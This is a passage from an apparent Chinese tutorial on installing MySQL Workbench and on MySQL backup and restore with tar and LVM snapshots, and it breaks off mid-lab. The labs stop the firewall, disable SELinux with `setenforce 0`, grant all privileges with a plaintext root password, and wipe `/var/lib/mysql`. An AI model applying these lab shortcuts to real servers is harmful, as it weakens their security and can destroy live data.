查询和管理数据库连接。在可视化SQL编辑工作模式下，用户创建表，删除表，修改表信息等只需要使用简单的可编辑列表中完成。 用户通常认为MySQL Workbench 是一个MySQL 数据库ER模型设计的工具，可以说是专门为MySQL数据库提供的数据库设计工具，用户使用MySQL Workbench可以很容易的设计、编辑数据库ER模型。这一功能可以说是MySQL Workbench的一大亮点。 软件获取 https://dev.mysql.com/downloads/workbench/ 软件安装 123456789101112[root@workstation software]# pwd/software[root@workstation software]# ls mysql-workbench-community-6.3.8-1.el7.x86_64.rpm mysql-workbench-community-6.3.8-1.el7.x86_64.rpm[root@workstation software]# rpm -ivh mysql-workbench-community-6.3.8-1.el7.x86_64.rpm warning: mysql-workbench-community-6.3.8-1.el7.x86_64.rpm: Header V3 DSA/SHA1 Signature, key ID 5072e1f5: NOKEYerror: Failed dependencies: tinyxml is needed by mysql-workbench-community-6.3.8-1.el7.x86_64 libzip is needed by mysql-workbench-community-6.3.8-1.el7.x86_64 python-paramiko &gt;= 1.15.1 is needed by mysql-workbench-community-6.3.8-1.el7.x86_64 proj is needed by mysql-workbench-community-6.3.8-1.el7.x86_64 libodbc.so.2()(64bit) is needed by mysql-workbench-community-6.3.8-1.el7.x86_64 libodbcinst.so.2()(64bit) is needed by mysql-workbench-community-6.3.8-1.el7.x86_64 需要一些依赖关系包，其中unixODBC和libzip本地yum中有，而tinyxml\\python-paramiko\\proj需要下载 12345678910111213141516171819202122232425262728293031323334353637383940414243[root@workstation workbench]# lslibtomcrypt-1.17-23.el7.x86_64.rpm mysql-workbench-community-6.3.8-1.el7.x86_64.rpmlibtomcrypt-devel-1.17-23.el7.x86_64.rpm proj-4.8.0-4.el7.x86_64.rpmlibtomcrypt-doc-1.17-23.el7.noarch.rpm python2-crypto-2.6.1-13.el7.x86_64.rpmlibtommath-0.42.0-4.el7.x86_64.rpm python2-ecdsa-0.13-4.el7.noarch.rpmlibtommath-devel-0.42.0-4.el7.x86_64.rpm python2-paramiko-1.16.1-1.el7.noarch.rpmlibtommath-doc-0.42.0-4.el7.noarch.rpm tinyxml-2.6.2-3.el7.x86_64.rpm[root@workstation workbench]# rpm -ivh libtommath* libtomcrypt* python2-crypto* python2-ecdsa* python2-paramiko* tinyxml* proj* Preparing... ################################# [100%] package libtommath-0.42.0-4.el7.x86_64 is already installed package libtomcrypt-1.17-23.el7.x86_64 is already installed package python2-crypto-2.6.1-13.el7.x86_64 is already installed package python2-ecdsa-0.13-4.el7.noarch is already installed package python2-paramiko-1.16.1-1.el7.noarch is already installed package libtomcrypt-devel-1.17-23.el7.x86_64 is already installed package libtommath-devel-0.42.0-4.el7.x86_64 is already installed package proj-4.8.0-4.el7.x86_64 is already installed package tinyxml-2.6.2-3.el7.x86_64 is already installed package libtomcrypt-doc-1.17-23.el7.noarch is already installed package libtommath-doc-0.42.0-4.el7.noarch is already installed[root@workstation workbench]# yum install -y unixODBC libzipLoaded plugins: langpacks, product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Package unixODBC-2.3.1-11.el7.x86_64 already installed and latest versionPackage libzip-0.10.1-8.el7.x86_64 already installed and latest versionNothing to do[root@workstation workbench]# rpm -ivh mysql-workbench-community-6.3.8-1.el7.x86_64.rpm warning: mysql-workbench-community-6.3.8-1.el7.x86_64.rpm: Header V3 DSA/SHA1 Signature, key ID 5072e1f5: NOKEYPreparing... ################################# [100%]Updating / installing... 1:mysql-workbench-community-6.3.8-1################################# [100%][root@workstation workbench]# [root@workstation workbench]# rpm -ql mysql-workbench-community |head /usr/bin/mysql-workbench/usr/bin/wbcopytables/usr/lib64/mysql-workbench/usr/lib64/mysql-workbench/libantlr3c_wb.so/usr/lib64/mysql-workbench/libcdbc.so/usr/lib64/mysql-workbench/libcdbc.so.6.3.8/usr/lib64/mysql-workbench/libctemplate.so/usr/lib64/mysql-workbench/libctemplate.so.3/usr/lib64/mysql-workbench/libctemplate.so.3.0.0/usr/lib64/mysql-workbench/libgdal.so.1 SQL Development的基本操作 创建数据库连接 创建新的数据库 创建和删除新的数据表 添加、修改表记录 查询表记录 修改表结构 启动MySQL Workbench 1[root@workstation ~]# mysql-workbench MySQL Workbench工作空间下对数据库数据进行管理之前，需要先创建数据库连接 建立连接前，需要在服务器上给MySQL Workbench授权 123456789101112131415161718[root@mastera ~]# systemctl start mariadb[root@mastera ~]# systemctl stop firewalld[root@mastera ~]# mysqlERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)[root@mastera ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 3Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; grant all on *.* to root@&apos;172.25.0.10&apos; identified by &apos;uplooking&apos;;Query OK, 0 rows affected (0.01 sec)MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 成功创建数据库连接后，可以创建新的数据库。 成功创建数据库连接后，在左侧的SCHEMAS下面可以看到test数据库。用户可以创建新的数据库，本小节主要创建和删除新的数据表操作。 下面简单介绍MySQL Workbench在图形界面下对数据库表的维护操作。 查询t1表中的数据操作。 使用WorkBench操作可以修改表的结构。 Data Modeling的基本操作 建立ER模型 导入ER模型 最后 执行 “File”-&gt;”Export” 按钮，选择 Forward Engineer SQL CREATE Script (ctrl+shift+G). 这样就可以把模型导出为SQL脚本文件。现在执行这个SQL文件就OK了。 Server Administration的基本操作 管理MySQL用户 备份MySQL数据库 还原MySQL数据库 管理MySQL用户 备份MySQL数据库 改备份为逻辑备份，使用的是mysqldump命令进行的，备份数据存放如下： 12[root@workstation ~]# ls /root/dumps/Dump20170207/db1_t1.sql db1_t2.sql 还原MySQL数据库 将db1库中的t1和t2表删除，进行还原","link":"/2016/12/26/booboo_mysql/01-Introduction-to-MySQL-and-MariaDB-databases/"},{"title":"MySQL 管理课程 第五课 备份与恢复","text":"为什么要备份服务器维护的工作永远都有一个不变的主题,那就是备份。正所谓,手里有粮,心里不慌。从事数据库相关工作一样永远都不要忘记一个重点:备份。因为,有了备份,我们就什么都不怕。出了任何问题(当然,我们善意的希望永远不要出什么问题),只要我们手上有完整的备份,那就有机会恢复回来。 2017年 1 月 31 日晚上恐怕是知名程序源码代管服务网站 GitLab 最长的一夜，因为一位工程师的疏忽造成大量资料流失，而又发现所有备份方案都无效而崩溃。 300GB 的资料被删到只剩下 4.5GB。而最后一个潜在可用的备份是 6 小时前手动操作的，一时之间连网站都连不进去了。根据该公司 Google docs 的维护纪录在最新的讯息提到：“这个事件影响了网站数据库（包括 issue 问题和 merge requests 合并请求），但不影响 git repos（git 版本管控档案库和 wiki 服务）。” 由于不是所有资料都遗失了，所以对用户来说还是稍感安慰，但是该文件在“遇到的问题”（Problems Encountered）小节里，最后总结： “因此，换句话说，部署的 5 个不同备份／还原技术中，没有一个能可靠地工作或第一时间还原回来，我们只能从 6 小时前有效的备份还原。” 亡羊补牢为时不晚，GitLab 展现诚意以 YouTube 直播与 Twitter 将讯息公诸于网络，但是看来 GitLab 必须非常努力，才能挽回客户与投资者对该公司的信心。对其他依赖资讯科技的公司而言，相信这也是很好的借镜。 什么是备份备份已经成为所有DBA的必修科目，到底什么是备份恢复呢？简单的讲：备份，就是把数据保存一份备用；恢复，就是把保存的数据还原回去。 当服务器出现故障需要修复，或者数据破坏需要恢复，又比如系统宕机、硬件损坏、用户错误删除数据等场景，都是需要借用备份才能执行恢复。 备份是备份，冗余是冗余。概念不一样，备份是将数据以隔离的方式保存，将备份的数据放在其他地方，原来的数据被上修改，备份的数据不会变更。也就是说备份出来的数据不会因为原数据的改变而改变，这样就比较安全。但是备份的缺点是，他不是瞬间还原，备份在还原过程中是有耗时的，他不是瞬间还原，例如，我们有几百个G的文件要还原回去，慢慢拷吧，几个小时。冗余不一样，他是热备，能够瞬间恢复。主服务器/从服务器，主服务器坏掉，从服务器就顶上工作，所以冗余在可用性上来讲，恢复的速度上来讲，比备份来的快，但是冗余有他的缺点，备份有他的优点，比如我们作主从同步，主服务器和从服务器数据都一样的，如果主服务器上有人错删了一个表，我们把这种操作称为误操作，那么从服务器也会发生误操作，所以呢，冗余不能解决人为的误操作，而备份可以解决。冗余他能解决硬件故障，但是误操作无法解决，备份不是瞬间还原，但是既可以解决硬件故障又能解决误操作，他们各有优劣点，而真实的线上生产环境是两种方法一起使用，既有冗余环境，又有周期性备份，管理员要周期性地进行备份，同时有多台服务器作冗余。 备份 定义 优点 缺点 备份 将数据以隔离的方式保存 解决硬件故障，误操作 不是瞬间还原 冗余 人为地增加重复部分，其目的是用来对原本的单一部分进行备份，以达到增强其安全性的目的,构建冗余（主服务器从服务器）的环境 恢复速度快 解决硬件故障，误操作无法解决 备份的两大要素 MySQL对存储引擎的选择会导致备份明显更复杂。问题是，对于给定的存储引擎，如何得到一致的备份。 实际上有两类一致性需要考虑：数据一致性和文件一致性。 数据一致性：备份数据在指定时间点一致 文件一致性：确保文件在磁盘上一致 服务可用性：数据库是否可以读写，既能读也能写才是服务可用。 当我们在备份数据的时候，如果有人在修改表的内容，那么我们备份出来的数据可能就会有问题，备份出来的数据可能不是我们要的时间点。比如我需要将4点这个状态的数据备份，从4点开始备份一直到5点结束，在这个过程中，有人在4.30修改一个数据，假设是将A员工的工资从4000改为5000，那么我们最后备份出来的数据到底是几点的状态就未知了。如果4.30的时候已经备份过A员工了，那么我们备份出来的A员工的工资就还是4000；如果4.30的时候还没有备份到A员工，那么我们最后备份出来的A员工的工资就变成5000了。这就是数据不一致的情况，那么我们如何来保证数据一致呢？ 备份的分类 分类：冷备、热备、异地灾备 冷备的分类： 物理备份、逻辑备份 完全备份、增量备份 在线（热）备份、温备份、离线（冷）备份 物理备份和逻辑备份有两种主要的方法来备份MySQL数据：逻辑备份（也叫“导出”）和直接复制原始文件的物理备份。逻辑备份将数据包含在一种MySQL能够解析的格式中，要么是SQL，要么是以某个符号分隔的文本。原始文件是指存在与硬盘上的文件。 任何一种备份都有其有点和缺点。 逻辑备份逻辑备份有如下优点： 逻辑备份是可以用编辑器或者像grep和sed之类的命令查看和操作的普通文件。当需要恢复数据或只想查看数据但不恢复时，这都是非常有帮助的。 恢复非常简单。可以通过管道把它们输入到mysql，或者使用mysqlimport。 可以通过网络来备份和恢复——也就是说，可以与Mysql主机不同的另外一台机器上操作。 可以在类似Amazon RDS这样不能访问底层文件系统的的系统中使用。 非常灵活，因为mysqldump———大部分人喜欢的工具——可以接受许多选项，例如可以用where子句来限制需要备份那些行。 与存储引擎无关。因为是从MySQL服务器中提取数据而生成，所以消除了底层数据存储和不同。因此，可以从InnoDB表中备份，然后只需极小的工作量就可以还原到MyISAM表中。而对于原始数据却不能这么做。 有助于避免数据损坏。如果磁盘驱动器有故障而要恢复原始文件时，你将会得到一个错误并且/或生成一个部分或损坏的备份。如果MySQL在内存中的数据还没有损坏，当不能够得到一个正常的原始文件复制时，有时还可以得到一个可以信赖的逻辑备份。 尽管如此，逻辑备份也有它的缺点： 必须由数据库服务器完成生成逻辑备份的工作，因此要使用更多的cpu周期。 逻辑备份在某些场景下比数据库文件本身还要更大。ASCII形式的数据不总是和存储引擎存储数据一样高效。 无法保证导出后再还原出来的一定是同样的数据。浮点表示的问题、软件Bug等都会导致问题，尽管非常少见。 从逻辑备份中还原需要MySQL加载和解释语句，转化为存储格式，并重建索引，所有这一切会很慢。 最大的缺点是从MySQL中导出数据和通过SQL语句将其加载回去的开消。如果使用逻辑备份，测试恢复需要的时间将非常重要。 物理备份物理备份有如下好处： 基于文件的物理备份，只需要将需要的文件复制到其他地方即可完成备份。不需要额外的工作来生成原始文件。 物理备份的恢复就更简单了，这取决于存储引擎。对于MyISAM，只需要简单地复制文件到目的地即可。对于InnoDB则需要停止数据库服务，可能还要采取其他一些步骤。 InnoDB和MyISAM的物理备份非常容易跨平台、操作系统和MySQL版本。（逻辑备份导出亦是如此。这里特别指出这一点是为了消除大家的担心。） 从物理备份中恢复会更开，无法完全缓冲到内容中，则物理备份的恢复要快非常多——至少要快一个数量级。事实上，逻辑备份最可怕的地方就是不确定的还原时间。 物理备份也有其缺点，比如： InnoDB的原始文件通常比相应的逻辑别分要大的多。InnoDB的表空间往往包含很多未使用的空间。还有很多空间用来存储数据以外的用途（插入缓冲、回滚段等）。 物理备份不总是跨平台、操作系统及MySQL版本。文件名大小写敏感和浮点格式可能会遇到麻烦。很可能因浮点格式不同而不能移动文件到另一个系统（虽然主流处理器都使用IEEE浮点格式。） 物理备份通常更加简单高效。尽管如此，对于需要长期保留的备份，或者是满足法律合规要求的备份，尽量不要完全依赖物理备份。至少每隔一段时间还是需要做一次逻辑备份。 除非经过测试，不要假定备份（特别是物理备份）是正常的。对InnoDB来说，这意味着需要启动一个MySQL实例，执行InnoDB恢复操作，然后运行CHECK TABLES。也可以跳过这一操作，仅对文件运行innochecksum，但我们不建议这样做。对于MyISAM，可以运行CHECK TABLES，或者使用mysqlcheck。使用mysqlcheck可以对所有表执行CHECK TABLES操作。 建议混合使用物理和逻辑两种方法来做备份：先使用物理复制，以此数据启动MySQL服务器实例并运行mysqlcheck。然后，周期性地使用mysqldump执行逻辑备份。这样做可以获得两种方法的优点，不会使生产服务器在导出时有过渡负担。如果能够方便地利用文件系统的快照，也可以生成一个快照，将该快照复制到另外一个服务器上并释放，然后测试原始文件，再执行逻辑备份。 注意：值得一提的是物理备份会更容易出错；很难像mysqldump一样简单。 增量备份和差异备份当数据量很庞大时，一个常见的策略是做定期的增量或差异备份。他们之间的区别有点容易让人混淆，所以先来澄清这两个术语： 差异备份，是对自上次全备份后所有改变的部分而做的备份；增量备份，是从任意类型的上次备份后所有修改做的备份； 例如，假设每周日做一个全备份。在周一，对自周日以来所有的改变做一个差异备份。在周二，就有两个选择：备份自周日以来所有的改变（差异），或只别分自周一后所有的改变（增量）。 增量和差异备份都是部分备份：它们一般不包含完整的数据集，因为某些数据几乎肯定没有改变。部分备份对减少服务器开销、备份时间及备份空间而言都很合适。尽管某些部分备份并不会真正减少服务器的开销。例如Percona XtraBackup和MySQL Enterprise Backup，仍然会扫描服务器上的所有数据块，因而并不会节约太多的开销，但它们确实会减少一定量的备份时间和大量用于压缩的CPU时间，当然也会减少磁盘空间使用。 不要因为会用高级备份技术而自负，解决方案越复杂，面临的风险也越大。要注意分析隐藏的危险，如果多次迭代备份紧密地耦合在一起，则只要其中的一次迭代备份有损坏，就可能导致所有的备份都无效。 下面有一些建议： 使用Percona XtraBackup和MySQL Enterprise Backup中的增量备份特性。 备份二进制日志。可以在每次备份后使用flush logs来开始一个新二进制日志，这样就只需要备份新的二进制日志。 不要备份没有变化的表。有些存储引擎，例如，MyISAM，会记录每个表最后修改时间。可以通过查看磁盘上的文件或运行show table status 来查看这个时间。如果使用InnoDB，可以利用触发器记录修改时间到一个小的“最后修改时间”表中，帮助跟踪最新的修改操作。需要确保只对变更不频繁的表进行跟踪，这样才能降低开销。通过定制的备份脚本可以轻松获取到哪些表有变更。例如，如果有包含不同语种各个月的名称列表，或者州或区域的简写之类的“查找”表，将它们放在一个单独的数据库是一个好主意，这样就不需要每次都备份这些表。 不要备份没有改变的行。有时候这样做影响会很大——例如，如果有一个从其他数据构建的数据仓库，从技术讲完全是冗余的，就可以仅备份构建仓库的数据，而不是数据仓库本身。即使从源数据文件重建仓库的“恢复”时间较长，这也是个好想法。相对于从全备份中可能获得的快速恢复时间，避免备份可以节约更多的宗的时间开销。临时数据也可以不用备份，例如保留网站会话数据的表。 备份所有的数据，然后发送到一个有去重特性的目的地，例如ZFS文件管理程序。 增量备份的缺点包括增加恢复复杂性，额外的风险，以及更长的恢复时间。如果可以做全备，考虑到简便性，我们建议尽量做全备。 不管如何，还是需要经常做全备份——建议至少一周一次。你肯定不希望使用一个月的所有增量备份来进行恢复。即使一周也还是有很多的工作和风险的。 在线（热）备份、温备份、离线（冷）备份如果可能，关闭MySQL做备份是最简单最安全的，也是所有获取一致性副本的方法中最好的，而且损坏或不一致的风险最小。如果关闭了MySQL，就根本不用关心InnoDB缓冲池中的脏页或这其他缓存。也不需要担心数据在尝试备份的过程中被修改，并且因为服务器不对应用提供访问，所以可以更快地完成备份。 尽管如此，让服务器停机的代价可能比看起来要更昂贵。即使能最小化停机时间，在高负载和高数据量下关闭和重启MySQL也可能要花很长一段时间。因此，必须要设计不需要生产服务器停机的备份。即便如此，由于一致性的需要，对服务器进行在线备份仍然会有明显的服务中断。 离线（冷）备份:备份过程中，服务中断 温备份：备份过程中，只能读不能写 在线（热）备份：备份过程中，服务正常使用 在规划备份时，有一些与性能相关的因素需要考虑。 锁时间：需要持有锁多长时间，例如在备份期间持有的全局 flush tables with read lock? 备份时间：复制备份到目的地需要多久？ 备份负载：在复制备份到目的地时对服务器性能的影响有多少？ 恢复时间：把备份镜像从存储位置复制到MySQL服务器，重放二进制日志等，需要多久？ 最大的权衡时备份时间与备份负载。可以牺牲其一以增加另外一个。例如，可以提高备份的优先级，代价是降低服务器性能。同样，也可以利用负载的特性来设计备份。 备份和恢复工具1) 物理备份：cp tar lvm快照方式 2) 逻辑备份：mysqldump tartar备份步骤 1）停止服务 systemctl stop mariadb 2）备份数据 tar -cf /tmp/mysql.all.tar /var/lib/mysql 3）启动服务 systemctl start mariadb tar还原步骤 1）停止服务 systemctl stop mariadb 2）清环境 rm -rf /var/lib/mysql/* 3）导入数据 tar -xf /tmp/mysql.all.tar -C / 4）启动服务 systemctl start mariadb 5）测试 &gt; select * from db1.t1; 课堂实战1: 利用tar实现物理备份并还原1234567891011121314151617181920212223242526272829303132# 备份[root@mastera0 ~]# systemctl stop mariadb[root@mastera0 ~]# tar -cf /tmp/mysql.all.tar /var/lib/mysql/tar: Removing leading \\`/\\&apos; from member names[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# ll /tmptotal 29772-rw-r--r--. 1 root root 30484480 Aug 30 11:28 mysql.all.tar# 还原[root@mastera0 ~]# systemctl stop mariadbot@mastera0 ~]# rm -rf /var/lib/mysql/*[root@mastera0 ~]# ll /var/lib/mysqltotal 0[root@mastera0 ~]# tar -xf /tmp/mysql.all.tar -C /[root@mastera0 ~]# ll /var/lib/mysqltotal 28700-rw-rw----. 1 mysql mysql 16384 Aug 30 11:27 aria_log.00000001-rw-rw----. 1 mysql mysql 52 Aug 30 11:27 aria_log_controldrwx------. 2 mysql mysql 32 Aug 30 11:24 db1-rw-rw----. 1 mysql mysql 18874368 Aug 30 11:27 ibdata1-rw-rw----. 1 mysql mysql 5242880 Aug 30 11:27 ib_logfile0-rw-rw----. 1 mysql mysql 5242880 Aug 30 11:23 ib_logfile1drwx------. 2 mysql mysql 4096 Aug 30 11:23 mysqldrwx------. 2 mysql mysql 4096 Aug 30 11:23 performance_schemadrwx------. 2 mysql mysql 6 Aug 30 11:23 test[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# echo \\&quot;select * from db1.t1\\&quot;|mysql -uroot -puplookingid12 LVM SnapShotlvm快照的优点和缺点事实上,MySQL 数据库的备份是一个让管理员一直很头疼的问题。各种工作虽 然 不 少 ,但是 各 有优 劣 , 想找 到一个 比较 完 美 的方 法 却 非常 困 难 。Mysqldump 作为数据的逻辑备份工具,弱点在于无法进行在线热备,同时在数据库比较大的时候,备份和恢复的时间是在长得让人无法接受。Mysqlhotcopy虽然克服了普通系统命令备份必须关闭 mysql 服务的尴尬,但是这东西只能用于备份使用 MYISAM 存储引擎的数据表,并且只能在类 UNIX 环境中使用。如果使用 mysql replication 的话,倒是可以解决热备问题。但是你需要承担增加一台服务器的成本。同时,如果数据被无意或恶意的篡改、删除,那么 slave服务器上的数据同样不能幸免。相对于以上方法,在中、大规模的 MySQL 应用环境中,我推荐使用 LVM 快照的方式来制作备份。为什么这种方式比较好呢? 原因如下: 1、 在大多数情况下,这种方式几乎算得上是热备。它无需关闭服务,只需要设置只读或者类似这样的限制。2、 支持所有基于本地磁盘的存储引擎,比如 MYISAM、InnoDB 和 BDB,还支持 Solid、PrimeXT 和 Faction。3、 备份速度最快,因为你只需要拷贝相关的二进制数据文件即可。4、 由于只是简单的拷贝文件,因此对服务器开销非常低。5、 保存方式多种多样,你可以备份到磁带上、FTP 服务器上、NFS 服务器上或者其他什么网络服务器,以及使用各种网络备份软件来备份。做到这些很简单,说到底就是拷贝文件而已。6、 恢复速度很快。恢复所需要的时间等于你把数据拷贝回来的时间。你可以想出更多的方法让这个时间变得更短。7、无需使用昂贵的商业软件。 当然,每个事物都有其两面性,它也存在一些缺点:1、 很明显,你的系统需要支持快照。2、 在一些公司里,系统管理员和 DBA 属于不同的团队。而使用快照需要系统 root 权限。因此,你可能需要做一些团队协调工作或者干脆在DBA Team 里安插一个系统管理员。这种事在某些公司很容易,但也可能很麻烦。3、 无法确切的预计服务停止时间。因为,这种方法到底什么时候算热备什么时候不算,完全取决于 FLUSH TABLE WITH READ LOCK 命令执行时间的长短。因此,我还是建议你在凌晨干这件事情。或者干脆定下一个维护时间段(比如某些网络游戏运营商的做法)。4、 如果你把日志放在独立的设备上或者你的数据分布在多个卷上,那么就比较麻烦了。因为这样一来你就无法得到全部数据的一致性快照,这就是所谓的多卷上的数据问题。不过,有些系统可能自动做到多卷快照。 现在,我们来看看如果使用 LVM 的快照功能来制作 MySQL 备份。当然,首先我们准备好相应的环境。配置一个 LVM,并且划分合适大小的LV,并且将其挂载到 MySQL 的数据文件目录上。在这个例子中,你可以看到我已经建立好了一个名叫 db1 的数据库,并且里面包含一个叫做 t1 的表,并且已经写入了一些数据。 /var/lib/mysql/—&gt;lv —-&gt;snapshot /dev/vdb—fdisk—/dev/vdb1 1G—-&gt;mkfs.ext4—&gt;目录树 /dev/vdb—fdisk—/dev/vdb1 1G–pv–vg–lv—&gt;mkfs.ext4—&gt;目录树 os支持lvm方式 lv1—/var/lib/mysql123456789101)fdisk2)pv3)vg4)lv5)mkfs ext4 (xfs)6)停止服务7)全备份tar8)挂接/var/lib/mysql/9)导入数据(注意权限，ugo，selinux)10)启动服务 lvm快照备份数据12345678910# 与数据库服务相关的操作 1)添加全局的读锁（只能读不能写---》数据不会变）&gt; flush tables with read lock; 2)创建快照 lvcreate -s -L 1G -n snap1 /dev/vgmysql/lv1 ---&gt;/dev/vgmysql/snap1 3)解锁 &gt; unlock tables;# 与数据库服务无关的操作 4)挂接快照 mount /dev/vgmysql/snap1 /mnt (如果是xfs，mount -o nouuid /dev/vgmysql/snap1 /mnt ) 5)tar打包 cd /mnt;tar -cf /tmp/mysql.2.tar ./* 6)umount umount /mnt 7)删除快照 lvremove /dev/vgmysql/snap1 lvm快照还原数据123451）停止服务 systemctl stop mariadb2）清环境 rm -rf /var/lib/mysql/*3）导入数据 tar -xf /tmp/mysql.2.tar -C /var/lib/mysql4）启动服务 systemctl start mariadb5）测试 &gt; select * from db1.t1; 课堂实战2: 利用LVM快照实现物理备份并还原123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226# lv1--&gt;/var/lib/mysql[root@mastera0 mysql]# fdisk -lDisk /dev/vda: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x000deb17 Device Boot Start End Blocks Id System/dev/vda1 * 2048 411647 204800 83 Linux/dev/vda2 411648 20971519 10279936 8e Linux LVMDisk /dev/vdb: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-root: 9458 MB, 9458155520 bytes, 18472960 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-swap: 536 MB, 536870912 bytes, 1048576 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-home: 524 MB, 524288000 bytes, 1024000 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes[root@mastera0 mysql]#[root@mastera0 mysql]# fdisk /dev/vdbWelcome to fdisk (util-linux 2.23.2).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Device does not contain a recognized partition tableBuilding a new DOS disklabel with disk identifier 0xb9ec589f.Command (m for help): nPartition type: p primary (0 primary, 0 extended, 4 free) e extendedSelect (default p): pPartition number (1-4, default 1): 1First sector (2048-41943039, default 2048):Using default value 2048Last sector, +sectors or +size{K,M,G} (2048-41943039, default 41943039): +1GPartition 1 of type Linux and of size 1 GiB is setCommand (m for help): nPartition type: p primary (1 primary, 0 extended, 3 free) e extendedSelect (default p): pPartition number (2-4, default 2): 2First sector (2099200-41943039, default 2099200):Using default value 2099200Last sector, +sectors or +size{K,M,G} (2099200-41943039, default 41943039): +1GPartition 2 of type Linux and of size 1 GiB is setCommand (m for help): pDisk /dev/vdb: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0xb9ec589f Device Boot Start End Blocks Id System/dev/vdb1 2048 2099199 1048576 83 Linux/dev/vdb2 2099200 4196351 1048576 83 LinuxCommand (m for help): wThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks.[root@mastera0 mysql]# ls /dev/vdb*/dev/vdb /dev/vdb1 /dev/vdb2[root@mastera0 mysql]# pvcreate /dev/vdb{1,2} Physical volume \\&quot;/dev/vdb1\\&quot; successfully created Physical volume \\&quot;/dev/vdb2\\&quot; successfully created[root@mastera0 mysql]# vgcreate vgmysql /dev/vdb{1,2} Volume group \\&quot;vgmysql\\&quot; successfully created[root@mastera0 mysql]# lvcreate -L 1G -n lv1 vgmysql Logical volume \\&quot;lv1\\&quot; created.[root@mastera0 mysql]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert home rhel -wi-ao---- 500.00m root rhel -wi-ao---- 8.81g swap rhel -wi-ao---- 512.00m lv1 vgmysql -wi-a----- 1.00g [root@mastera0 mysql]# mkfs.ext4 /dev/vgmysql/lv1mke2fs 1.42.9 (28-Dec-2013)Filesystem label=OS type: LinuxBlock size=4096 (log=2)Fragment size=4096 (log=2)Stride=0 blocks, Stripe width=0 blocks65536 inodes, 262144 blocks13107 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=2684354568 block groups32768 blocks per group, 32768 fragments per group8192 inodes per groupSuperblock backups stored on blocks: 32768, 98304, 163840, 229376Allocating group tables: done Writing inode tables: done Creating journal (8192 blocks): doneWriting superblocks and filesystem accounting information: done[root@mastera0 mysql]#[root@mastera0 mysql]# systemctl stop mariadb[root@mastera0 mysql]# tar -cf /tmp/mysql.1.tar /var/lib/mysql/tar: Removing leading \\`/\\&apos; from member names[root@mastera0 mysql]# mount /dev/vgmysql/lv1 /var/lib/mysql^C[root@mastera0 mysql]# ll -dZ /var/lib/mysqldrwxr-xr-x. mysql mysql system_u:object_r:mysqld_db_t:s0 /var/lib/mysql[root@mastera0 mysql]# mount /dev/vgmysql/lv1 /var/lib/mysql[root@mastera0 mysql]# ll -dZ /var/lib/mysqldrwxr-xr-x. root root system_u:object_r:unlabeled_t:s0 /var/lib/mysql[root@mastera0 mysql]# ll /var/lib/mysqltotal 16drwx------. 2 root root 16384 Aug 30 13:57 lost+found[root@mastera0 ~]# ll -d /var/lib/mysqldrwxr-xr-x. 3 root root 4096 Aug 30 13:57 /var/lib/mysql[root@mastera0 ~]# tar -xf /tmp/mysql.1.tar -C /[root@mastera0 ~]# ll -d /var/lib/mysqldrwxr-xr-x. 7 mysql mysql 4096 Aug 30 14:01 /var/lib/mysql[root@mastera0 ~]# ll /var/lib/mysqltotal 28724-rw-rw----. 1 mysql mysql 16384 Aug 30 14:01 aria_log.00000001-rw-rw----. 1 mysql mysql 52 Aug 30 14:01 aria_log_controldrwx------. 2 mysql mysql 4096 Aug 30 11:24 db1-rw-rw----. 1 mysql mysql 18874368 Aug 30 14:01 ibdata1-rw-rw----. 1 mysql mysql 5242880 Aug 30 14:01 ib_logfile0-rw-rw----. 1 mysql mysql 5242880 Aug 30 11:23 ib_logfile1drwx------. 2 root root 16384 Aug 30 13:57 lost+founddrwx------. 2 mysql mysql 4096 Aug 30 11:23 mysqldrwx------. 2 mysql mysql 4096 Aug 30 11:23 performance_schemadrwx------. 2 mysql mysql 4096 Aug 30 11:23 test[root@mastera0 ~]# systemctl start mariadbJob for mariadb.service failed because the control process exited with error code. See &quot;systemctl status mariadb.service&quot; and &quot;journalctl -xe&quot; for details.[root@mastera0 ~]# setenforce 0[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# ll /var/lib/mysql -Z-rw-rw----. mysql mysql unconfined_u:object_r:unlabeled_t:s0 aria_log.00000001-rw-rw----. mysql mysql unconfined_u:object_r:unlabeled_t:s0 aria_log_controldrwx------. mysql mysql 